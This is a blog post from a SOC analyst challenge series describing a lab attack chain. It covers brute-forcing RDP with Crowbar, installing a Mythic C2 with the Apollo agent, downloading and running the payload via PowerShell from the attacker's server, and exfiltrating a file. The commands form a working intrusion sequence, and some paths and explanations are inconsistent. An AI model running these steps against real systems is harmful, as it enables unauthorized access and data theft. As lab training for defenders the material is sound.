+++ 
draft = false
date = 2025-09-13T18:15:20+01:00
title = "Mythic Agent Setup Tutorial, Day 21"
description = "SOC Analyst Challenge, Day 21 "
slug = "SOC Analyst Challenge, Day 21"
authors = "Seclice"
tags = ["SOC", "cybersecurity", "SOC Analyst", "ELK", "challenge"]
categories = ["SOC",""]
series = []
+++


## Day 21: Mythic Agent Setup Tutorial
Ressources :[MyDFIR Channel](https://www.youtube.com/@MyDFIR/)
 

### **Attack Chain: From Initial Access to Agent Execution**

#### **Phase 1: Prepare the Target (On Windows Server 2022)**
This creates a "flag" for you to exfiltrate later.
1.  Open **Command Prompt** as administrator.
2.  Create the password file:
    ```cmd
    echo secret! > C:\Users\Public\Documents\secret.txt
    ```

#### **Phase 2: Prepare the Attack (On Parrot OS or KAli)**
1.  **Create the Wordlist:**
    ```bash
    # Create a wordlist file containing the known password
    echo "ThisIsTheAdminPassword!" > wordlist.txt

    # You can add more passwords for a realistic brute-force
    echo "Password123!" >> wordlist.txt
    echo "admin" >> wordlist.txt
    echo "Administrator" >> wordlist.txt
    ```

2.  **Brute Force RDP with Crowbar:**
    *   **Fix:** The `-C` flag should be `-C` (capital C) for the wordlist file, and the `-s` Target IP address/range (in CIDR notation)
. Use the IP alone.
    ```bash
    crowbar -b rdp -s ip@Win-server/32 -u administrator -C wordlist.txt
    ```
    *   *If successful, Crowbar will find the correct password.*

3.  **Test RDP Access with xfreerdp:**
    ```bash
    xfreerdp /u:administrator /p:'ThisIsTheAdminPassword!' /v:ip@Win-server
    ```

#### **Phase 3: Set Up the C2 Infrastructure (On Mythic Server)**
1.  **Install the Apollo Agent:** [Agents](https://github.com/mythicagents)

    ```bash
    # Navigate to your Mythic directory first
    cd ~/Mythic
    ./mythic-cli install github https://github.com/MythicAgents/Apollo.git
    ```
    *Wait for the installation to complete. Check status with `./mythic-cli status`.*

2.  **Install the HTTP C2 Profile:** [C2Profiles](https://github.com/mythicC2Profiles)
    ```bash
    ./mythic-cli install github https://github.com/MythicC2Profiles/http
    ```
    *This profile allows agents to communicate over HTTP.*

3.  **Open Firewall Ports:**
    ```bash
    # Allow HTTP (port 80) and your custom download port (9999)
    sudo ufw allow 80
    sudo ufw allow 9999
    sudo ufw reload
    ```

#### **Phase 4: Staging & Execution (on your computer)**
1.  **In the Mythic Web UI (`https://your-mythic-ip:7443`):**
    *   **Create a Payload:** Go to **Payloads > Create Payload**.
        *   **Payload Type:** `apollo`
        *   **C2 Profile:** `http`
        *   **Set the listening port to `80`** in the profile parameters.
        *   **Platform:** `Windows`
        *   **Create** and then **Download** the payload (e.g., `payload.exe`).

2.  **Host the Payload on the Mythic Server:**
    ```bash
    # download the payload, you can find the link on the payload page by clicking on the icon download ad copy link
    wget https://your-mythic-ip:7443/direct/download/781dff88-3f72-4776-b176-6c9de1163ea5 
    ```
    **move the payload to Home (on Mythic server)** so we can download it later.
    ```bash
    # Start a simple HTTP server on port 9999
    python3 -m http.server 9999
    ```

3.  **On Parrot OS (Inside your RDP Session):**
    *   After using `xfreerdp` to log into the Windows Server, open **PowerShell**.
    *   **Download and Execute the Payload:**
        ```powershell
        # Download the payload from your Mythic server's Python HTTP server
        Invoke-WebRequest -Uri "http://your-mythic-ip:9999/payload.exe" -OutFile "C:Users\Public\Downloads\payload.exe"

        # Execute the payload
        cd C:Users\Public\Downloads\
        .\payload.exe
        ```
        - Explanation:
			- & is the PowerShell call operator, used to execute commands.
			- "$env:USERPROFILE\Downloads\payload.exe" builds the full path as a string.
			- $env:USERPROFILE is an environment variable that expands to C:\Users\<your_username>.
			- The entire path is wrapped in quotes in case there are spaces in the username.

    *   **Important:** Close the RDP session but leave the payload running.

#### **Phase 5: Post-Exploitation (On Mythic Web UI)**
1.  **Check for Callbacks:** Go to **Operators > Active Connections**. You should see a new callback from the Windows Server.
2.  **Interact with the Agent:** Click **Select** next to the callback to open a command session.
3.  **Exfiltrate the Password File:**
    ```bash
    # Use the Apollo 'download' command
    download C:\Users\Public\Documents\secret.txt
    ```
4.  **Search for Files (Optional):** You can also use the `ls` and `cd` commands to browse the file system and find the `password.txt` file.

{{<mermaid>}}
flowchart TD
A["Phase 1: Prep Target<br>Create password.txt on Windows"]
B["Phase 2: Brute Force<br>Parrot OS: Crowbar & xfreerdp"]
C["Phase 3: Setup C2<br>Mythic: Install Apollo & HTTP Profile"]
D["Phase 4: Staging<br>Mythic: Host Payload<br>Parrot: Download via RDP"]
E["Phase 5: Exfiltration<br>Mythic UI: Interact & Download file"]

A --> B
B -- "RDP Access" --> D
C -- "Payload" --> D
D -- "Agent Execution" --> E
{{</mermaid>}}

This chain effectively demonstrates the core stages of a cyber attack: reconnaissance/access, deployment, command & control, and actions on objectives. 

